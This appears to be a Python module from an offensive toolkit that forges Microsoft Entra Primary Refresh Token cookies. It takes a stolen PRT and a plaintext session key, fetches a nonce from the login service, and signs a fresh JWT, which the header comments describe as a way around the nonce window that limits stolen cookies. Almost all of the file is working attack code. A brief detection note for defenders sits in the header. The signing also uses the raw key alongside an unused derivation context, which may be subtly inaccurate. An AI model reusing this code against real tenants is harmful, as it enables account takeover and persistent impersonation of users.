# ================================================================
# MODULE: quantum_mechanic.providers.entra.nonce
# ----------------------------------------------------------------
# PURPOSE:   Operator-side PRT cookie derivation.
#
#            When QM holds a raw PRT + session key (prt_with_key),
#            it can mint a fresh x-ms-RefreshTokenCredential JWT
#            on demand without touching ESTS — bypassing the 5-min
#            nonce window that kills stolen cookies.
#
# HOW IT WORKS:
#   1. Caller fetches a nonce from login.microsoftonline.com.
#   2. We build a header+payload JSON structure and sign it with
#      HMAC-SHA256 using the session key (base64-decoded).
#   3. The resulting JWT is accepted by ESTS as a PRT cookie.
#
# KEY STRUCTURE (from AAD JWT-Bearer PRT spec):
#   Header: { "alg": "HS256", "ctx": <random 24-byte b64> }
#   Payload: {
#       "refresh_token": <prt_value>,
#       "is_primary": "true",
#       "request_nonce": <nonce-from-ests>,
#   }
#
# DETECTION (Blue Team):
#   PRT cookie exchanges appear as "Primary Refresh Token" in
#   Entra sign-in logs. Session key extraction requires device
#   access (DPAPI / TPM); this module assumes the key is already
#   in plaintext (post-extraction).
# ================================================================

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
from typing import Any

import httpx

NONCE_EP = "https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"


def fetch_nonce(tenant_id: str = "common", http: httpx.Client | None = None) -> str:
    """Fetch a fresh nonce from ESTS for PRT cookie signing.

    ESTS returns a signed nonce in the error response to a
    minimal token request. The nonce is embedded in the
    AADSTS70011 error description.

    Returns:
        The nonce string (≈ 90 bytes, base64url-encoded).

    Raises:
        ValueError: if ESTS does not return a usable nonce.
    """
    url = NONCE_EP.format(tenant=tenant_id)
    data = {
        "grant_type": "srv_challenge",
        "client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",  # Windows Hello for Business
    }
    owned = http is None
    client = http or httpx.Client(timeout=15)
    try:
        resp = client.post(url, data=data)
        body = resp.json()
        # ESTS returns the nonce in error_codes list or error_description
        nonce = body.get("Nonce") or body.get("nonce")
        if nonce:
            return nonce
        desc = body.get("error_description", "")
        # Format: "AADSTS70011: ... Nonce=<value>"
        if "Nonce=" in desc:
            return desc.split("Nonce=", 1)[1].split("&")[0].strip()
        raise ValueError(f"No nonce in ESTS response: {body}")
    except httpx.HTTPError as e:
        raise ValueError(f"Failed to fetch nonce from ESTS: {e}") from e
    finally:
        if owned:
            client.close()


def mint_prt_cookie(
    prt_value: str,
    session_key_b64: str,
    nonce: str,
) -> str:
    """Derive a signed x-ms-RefreshTokenCredential JWT.

    Uses HMAC-SHA256 with the session key to produce a PRT cookie
    that ESTS accepts in place of a stolen one. The nonce binds the
    cookie to a specific authentication attempt (~5 min window on
    ESTS side, but we can re-mint instantly).

    Args:
        prt_value:       The raw PRT value from the device store.
        session_key_b64: The session key, base64-encoded (standard or URL-safe).
        nonce:           A fresh nonce from fetch_nonce().

    Returns:
        A signed JWT string suitable for use as x-ms-RefreshTokenCredential.
    """
    session_key = _decode_session_key(session_key_b64)

    ctx = base64.urlsafe_b64encode(os.urandom(24)).rstrip(b"=").decode()
    header: dict[str, Any] = {"alg": "HS256", "ctx": ctx}
    payload: dict[str, Any] = {
        "refresh_token": prt_value,
        "is_primary": "true",
        "request_nonce": nonce,
    }

    return _sign_jwt(header, payload, session_key)


def _decode_session_key(key_b64: str) -> bytes:
    """Decode a session key from base64 (standard or URL-safe, with/without padding)."""
    key_b64 = key_b64.strip()
    # Normalise URL-safe → standard, then add padding.
    key_b64 = key_b64.replace("-", "+").replace("_", "/")
    pad = (4 - len(key_b64) % 4) % 4
    key_b64 += "=" * pad
    return base64.b64decode(key_b64)


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _sign_jwt(header: dict, payload: dict, key: bytes) -> str:
    """Produce a compact JWS (header.payload.signature) signed with HS256."""
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url(sig)}"
